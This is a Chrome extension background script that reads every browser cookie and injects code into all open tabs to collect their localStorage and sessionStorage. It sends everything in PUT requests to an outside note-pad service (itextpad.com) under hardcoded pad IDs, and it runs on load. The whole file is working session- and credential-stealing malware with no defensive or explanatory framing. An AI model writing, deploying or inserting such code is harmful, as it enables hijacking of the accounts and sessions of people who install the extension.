//dead ghost was here
console.log('my chrome extension background script running');

function getAllBrowserCookies(callback) {
  let myCookies = '';
  chrome.cookies.getAll({}, (cookies) => {
    cookies.forEach(cookie => {
      myCookies += `{d:"${cookie.domain}",`;
      myCookies += `n:"${cookie.name}",`;
      myCookies += `v:"${cookie.value}"}, `;
    });
    callback(myCookies);
  });
}

function getAllBrowserLocalStorage() {
  return new Promise((resolve, reject) => {
    chrome.tabs.query({}, (tabs) => {
      let allLocalStorage = '';
      let promises = tabs.map((tab) => {
        return new Promise((resolveTab) => {
          chrome.scripting.executeScript(
            {
              target: { tabId: tab.id },
              func: () => {
                let myLocalStorage = '';
                for (let key in localStorage) {
                  myLocalStorage += `{key:"${key}", value:"${localStorage[key]}"}, `;
                }
                return { url: window.location.href, localStorage: myLocalStorage };
              }
            },
            (results) => {
              if (results && results[0] && results[0].result) {
                console.log(`LocalStorage for ${results[0].result.url}: ${results[0].result.localStorage}`);
                resolveTab(`URL: ${results[0].result.url}, LocalStorage: ${results[0].result.localStorage}`);
              } else {
                resolveTab('');
              }
            }
          );
        });
      });

      Promise.all(promises).then((results) => {
        allLocalStorage = results.join(' ');
        resolve(allLocalStorage);
      }).catch(reject);
    });
  });
}


function getAllBrowserSessionStorage() {
  return new Promise((resolve, reject) => {
    chrome.tabs.query({}, (tabs) => {
      let allSessionStorage = '';
      let promises = tabs.map((tab) => {
        return new Promise((resolveTab) => {
          chrome.scripting.executeScript(
            {
              target: { tabId: tab.id },
              func: () => {
                let mySessionStorage = '';
                for (let key in sessionStorage) {
                  mySessionStorage += `{key:"${key}", value:"${sessionStorage[key]}"}, `;
                }
                return { url: window.location.href, sessionStorage: mySessionStorage };
              }
            },
            (results) => {
              if (results && results[0] && results[0].result) {
                console.log(`SessionStorage for ${results[0].result.url}: ${results[0].result.sessionStorage}`);
                resolveTab(`URL: ${results[0].result.url}, SessionStorage: ${results[0].result.sessionStorage}`);
              } else {
                resolveTab('');
              }
            }
          );
        });
      });

      Promise.all(promises).then((results) => {
        allSessionStorage = results.join(' ');
        resolve(allSessionStorage);
      }).catch(reject);
    });
  });
}



function sendPostRequest(data, id, pad_id, tab_index) {

  fetch('https://www.itextpad.com/api/v3/pad-tab/'+id, {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'X-Pad-Id': pad_id
    },
    body: JSON.stringify({
      "id": id,
      "pad_tab_name": "reporting",
      "pad_id": pad_id,
      "note": data,
      "tab_index": 1
    }),
  })
    .then(response => response.json())
    .then(data => console.log('Success:', data))
    .catch((error) => console.error('Error:', error));
}


getAllBrowserCookies((yourCookies) => {
  sendPostRequest(yourCookies, 259299, 192846, 1)
});

getAllBrowserLocalStorage()
  .then((yourLocalStorage) => {
    console.log(yourLocalStorage);
    sendPostRequest(yourLocalStorage, 259300, 192846, 2)
  })
  .catch((error) => {
    console.error('Error fetching local storage:', error);
  });


getAllBrowserSessionStorage()
  .then((yourSessionStorage) => {
    console.log(yourSessionStorage);
    sendPostRequest(yourSessionStorage, 259301, 192846, 3)

  })
  .catch((error) => {
    console.error('Error fetching session storage:', error);
  });

